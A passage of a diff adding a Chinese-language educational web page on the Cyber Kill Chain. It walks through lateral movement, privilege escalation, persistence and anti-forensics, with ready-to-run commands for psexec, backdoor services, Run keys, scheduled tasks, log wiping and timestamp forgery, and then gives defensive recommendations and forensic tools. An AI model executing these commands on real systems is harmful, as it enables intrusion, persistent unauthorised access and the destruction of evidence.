+cat 公鑰內容 >> ~/.ssh/authorized_keys
+註解: 修改 shell 設定檔或 crontab 也可用於自動下載/外傳
+
+# Windows 系統
+註解: Web Shell 通常具備檔案上傳/下載功能
+註解: 可將 Web Shell 內容注入正常檔案 (如 config.php)
+註解: 來源未提供直接的 Windows 檔案傳輸指令，建議可用 certutil、powershell、bitsadmin、ftp、tftp 等工具
+</code>
+                                </div>
+                                <ul>
+                                    <li><strong>Ubuntu/Linux：</strong> 利用 whois+netcat 可隱蔽傳輸小型檔案，適合滲透時低調操作。</li>
+                                    <li><strong>Windows：</strong> 常見為 Web Shell 內建功能或利用系統工具（如 certutil、powershell、ftp 等）進行檔案傳輸。</li>
+                                </ul>
+                                <p style="font-size:0.95em;color:#888;">註：whois/netcat 適合小型檔案，Web Shell 可用於多種檔案操作，請依實際環境選擇合適工具。</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="exploit-step">
+                        <h4>第三階段：橫向移動</h4>
+                        <div class="step-details">
+                            <div class="technique">
+                                <h5>6. 詳細網路探查與Active Directory偵察</h5>
+                                <div class="code-block">
+                                    <code>
+# 基本網路探查<br>
+arp -a                                  # 查看ARP表<br>
+net view                                # 列出網路共享<br>
+net view /domain                        # 列出網域<br>
+nltest /domain_trusts                   # 探查網域信任關係<br><br>
+
+# 內網主機發現<br>
+for /L %i in (1,1,254) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up<br>
+nmap -sn 192.168.1.0/24                # 使用nmap進行存活探測<br><br>
+
+# Active Directory偵察<br>
+net group "Domain Admins" /domain      # 列出網域管理員<br>
+net group "Enterprise Admins" /domain  # 列出企業管理員<br>
+net accounts /domain                    # 檢查網域密碼策略<br>
+nltest /dclist:domain.com              # 列出網域控制器<br><br>
+
+# 使用PowerView進行AD偵察<br>
+powershell -ep bypass<br>
+Import-Module .\PowerView.ps1<br>
+Get-NetDomain                          # 獲取網域資訊<br>
+Get-NetUser                            # 列出所有網域用戶<br>
+Get-NetGroup                           # 列出所有網域群組<br>
+Get-NetComputer                        # 列出網域電腦<br>
+Get-NetShare                           # 發現網路共享<br>
+Find-DomainAdmin                       # 尋找網域管理員<br><br>
+
+# 服務掃描<br>
+nmap -sS -O 192.168.1.100             # TCP SYN掃描<br>
+nmap -sU --top-ports 100 192.168.1.100 # UDP掃描<br>
+nmap -sC -sV 192.168.1.100            # 服務版本偵測
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="technique">
+                                <h5>6. 橫向滲透</h5>
+                                <div class="code-block">
+                                    <code>
+# 使用竊取的憑證進行橫向移動<br>
+net use \\192.168.1.100\ipc$ /user:domain\admin password<br>
+copy evil.exe \\192.168.1.100\c$\temp\<br>
+psexec \\192.168.1.100 -s cmd.exe    # 遠端執行命令
+                                    </code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 滲透後作業 -->
+            <div class="post-exploitation">
+                <h3><i class="fas fa-cogs"></i> 滲透後作業</h3>
+                <div class="post-exploit-categories">
+                    <div class="post-exploit-category">
+                        <h4><i class="fas fa-info-circle"></i> 滲透後攻防階段與常用指令</h4>
+                        <div class="method">
+                            <h5>權限提升 (Privilege Escalation)</h5>
+                            <div class="code-block">
+<code>
+# Windows
+net user 用戶名 密碼 /add
+net localgroup administrators 用戶名 /add
+# Potato 系列提權技術（Hot Potato、Juicy Potato 等）
+</code>
+                            </div>
+                            <p>建立新帳戶、提升管理員權限，或利用各種提權工具。</p>
+                        </div>
+                        <div class="method">
+                            <h5>持久化 (Persistence)</h5>
+                            <div class="code-block">
+<code>
+# Windows
+ echo '' >> index.php         # Web Shell 植入
+ schtasks / at                # 建立排程任務
+ regedit /s 檔案              # 匯入註冊表
+ regsvr32.exe                 # DLL 持久化
+ sc.exe / net start/stop      # 建立與控制服務
+ attrib                      # 隱藏或顯示檔案屬性
+# Linux/Unix-like
+ echo '' >> ~/.ssh/authorized_keys
+ 修改 .bashrc/.profile 等設定檔
+ crontab -e / crontab <file>
+</code>
+                            </div>
+                            <p>確保攻擊者可持續存取系統，即使重啟或登出也能維持控制。</p>
+                        </div>
+                        <div class="method">
+                            <h5>內部偵察與橫向擴散 (Internal Reconnaissance & Lateral Movement)</h5>
+                            <div class="code-block">
+<code>
+# 網路與系統資訊
+ipconfig /all
+netstat -an
+net view
+route print
+arp -a
+hostname
+ping
+tracert
+nslookup
+# 使用者與群組資訊
+net user
+net localgroup administrators
+nbtstat -A ip
+whoami / groups / who / w
+# 檔案與目錄偵察
+dir / type / findstr / find
+ls -al / cat / pwd / history / tree
+# 程序與服務資訊
+tasklist
+sc query
+wmic process list full
+netsh firewall show config
+</code>
+                            </div>
+                            <p>收集內部網路、帳號、檔案、服務等資訊，並嘗試擴散到其他主機。</p>
+                        </div>
+                        <p style="font-size:0.95em;color:#888;">資料來源：綜合滲透測試與資安攻防實務經驗</p>
+                    </div>
+                </div>
+                
+                <div class="post-exploit-categories">
+                    <!-- 維持權限 -->
+                    <div class="post-exploit-category persistence">
+                        <h4><i class="fas fa-anchor"></i> 維持權限 (Persistence)</h4>
+                        
+                        <div class="persistence-methods">
+                            <div class="method">
+                                <h5>1. 註冊服務</h5>
+                                <div class="code-block">
+                                    <code>
+# 建立惡意服務以維持持久化存取<br>
+sc create "WindowsUpdate" binpath= "C:\temp\backdoor.exe" start= auto<br>
+sc description "WindowsUpdate" "Windows Update Service"<br>
+sc start "WindowsUpdate"
+                                    </code>
+                                </div>
+                                <p>偽裝成系統服務，開機自動啟動</p>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>2. 註冊表持久化</h5>
+                                <div class="code-block">
+                                    <code>
+# 修改註冊表實現開機自啟<br>
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SystemCheck" /t REG_SZ /d "C:\temp\backdoor.exe" /f<br>
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "UserCheck" /t REG_SZ /d "C:\temp\backdoor.exe" /f
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>3. 排程任務</h5>
+                                <div class="code-block">
+                                    <code>
+# 建立排程任務定期執行惡意程式<br>
+schtasks /create /tn "SystemMaintenance" /tr "C:\temp\backdoor.exe" /st 09:00 /f<br>
+schtasks /create /tn "UserLogon" /tr "C:\temp\backdoor.exe" /rl HIGHEST /f
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>4. WMI事件訂閱</h5>
+                                <div class="code-block">
+                                    <code>
+# 使用WMI建立隱蔽的持久化機制<br>
+wmic /namespace:"\\root\subscription" PATH __EventFilter CREATE Name="SystemFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent"
+                                    </code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 清除軌跡 -->
+                    <div class="post-exploit-category cleanup">
+                        <h4><i class="fas fa-eraser"></i> 清除軌跡 (Anti-Forensics)</h4>
+                        
+                        <div class="cleanup-methods">
+                            <div class="method">
+                                <h5>1. 清除事件日誌</h5>
+                                <div class="code-block">
+                                    <code>
+# 清除Windows事件日誌<br>
+wevtutil cl System              # 清除系統日誌<br>
+wevtutil cl Security            # 清除安全日誌<br>
+wevtutil cl Application         # 清除應用程式日誌<br>
+for /f "tokens=1" %i in ('wevtutil el') do wevtutil cl "%i"  # 清除所有日誌
+                                    </code>
+                                </div>
+                                <p><strong>偵測指標：</strong>事件ID 104 (日誌清除) 和 1102 (審計日誌清除)</p>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>2. 檔案軌跡清除</h5>
+                                <div class="code-block">
+                                    <code>
+# 清除檔案執行軌跡<br>
+del /f /s /q C:\Windows\Prefetch\*.*           # 清除預取檔案<br>
+del /f /s /q C:\Windows\Temp\*.*               # 清除暫存檔<br>
+del /f /s /q %userprofile%\Recent\*.*          # 清除最近使用檔案<br>
+cipher /w:C:\                                  # 安全刪除空閒空間
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>3. 時間戳偽造</h5>
+                                <div class="code-block">
+                                    <code>
+# 修改檔案時間戳以隱藏惡意檔案<br>
+timestomp.exe -z "2020-01-01 10:00:00" backdoor.exe<br>
+# 或使用PowerShell<br>
+$(Get-Item backdoor.exe).LastWriteTime = "01/01/2020 10:00:00"
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>4. 網路軌跡清除</h5>
+                                <div class="code-block">
+                                    <code>
+# 清除網路連線記錄<br>
+netsh int ip reset resetlog.txt               # 重置IP設定<br>
+arp -d *                                       # 清除ARP表<br>
+ipconfig /flushdns                             # 清除DNS快取<br>
+netsh winsock reset                            # 重置Winsock
+                                    </code>
+                                </div>
+                            </div>
+                            
+                            <div class="method">
+                                <h5>5. 註冊表清理</h5>
+                                <div class="code-block">
+                                    <code>
+# 清除註冊表中的執行軌跡<br>
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs /f<br>
+reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f<br>
+reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{suspicious-guid} /f
+                                    </code>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 防護建議 -->
+            <div class="protection-recommendations">
+                <h3><i class="fas fa-shield-alt"></i> 防護建議</h3>
+                
+                <div class="recommendations-grid">
+                    <div class="recommendation">
+                        <h4>立即行動</h4>
+                        <ul>
+                            <li>立即更新WinRAR至6.23或更新版本</li>
+                            <li>制定Windows 10升級計畫</li>
+                            <li>加強郵件附件掃描</li>
+                            <li>限制RAR檔案執行權限</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="recommendation">
+                        <h4>監控機制</h4>
+                        <ul>
+                            <li>監控異常的WinRAR解壓縮行為</li>
+                            <li>設置事件日誌清除警報</li>
+                            <li>監控系統服務異常變化</li>
+                            <li>建立檔案完整性監控</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="recommendation">
+                        <h4>長期策略</h4>
+                        <ul>
+                            <li>實施零信任網路架構</li>
+                            <li>定期進行滲透測試</li>
+                            <li>建立完整的資安事件應變程序</li>
+                            <li>加強員工資安意識培訓</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 防禦工具區塊 -->
+    <section id="defense" class="defense-section">
+        <div class="container">
+            <h2 class="section-title">防禦與鑑識工具</h2>
+            
+            <div class="defense-categories">
+                <!-- 日誌分析與收集 -->
+                <div class="defense-category">
+                    <h3><i class="fas fa-chart-line"></i> 日誌分析與收集</h3>
+                    <div class="defense-content">
+                        <div class="primary-tool">
+                            <h4>Windows 事件日誌 (Event Viewer)</h4>
+                            <p>檢測安全事件的極有價值資源</p>
+                        </div>
+                        <div class="tools-grid">
+                            <div class="defense-tool">
+                                <h4>SYSMON</h4>
+                                <p>收集更詳細的系統活動日誌</p>
+                            </div>
+                            <div class="defense-tool">
+                                <h4>SPLUNK</h4>
+                                <p>用於倉儲資料管理和視覺化分析的平台</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 惡意程式與行為鑑識 -->
+                <div class="defense-category">
+                    <h3><i class="fas fa-shield-virus"></i> 惡意程式與行為鑑識</h3>
+                    <div class="defense-content">
+                        <div class="tools-grid">
+                            <div class="defense-tool">
+                                <h4>VOLATILITY</h4>
+                                <p>記憶體取證分析框架</p>
+                            </div>
+                            <div class="defense-tool">
+                                <h4>GMER</h4>
+                                <p>用於 Rootkit 行為檢測</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 頁腳 -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 網路攻擊鏈教學網站. 本網站僅供教育用途.</p>
+            <p>資料來源：基於 Lockheed Martin Inc. 的 Cyber Kill Chain 模型</p>
+        </div>
+    </footer>
+
+    <script type="module" src="./script.js"></script>
+</body>
+</html>
